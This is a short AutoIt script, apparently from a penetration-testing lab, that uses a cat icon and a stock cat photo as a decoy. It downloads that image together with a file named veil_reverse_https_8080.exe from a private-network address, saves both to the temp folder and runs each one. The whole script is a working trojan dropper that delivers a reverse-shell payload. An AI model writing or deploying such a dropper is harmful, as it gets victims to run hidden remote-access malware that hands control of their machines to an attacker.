#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=cat.ico
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "https://www.rd.com/wp-content/uploads/2021/03/GettyImages-140594401-1-scaled.jpg,http://192.168.122.108/evil-files/veil_reverse_https_8080.exe"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
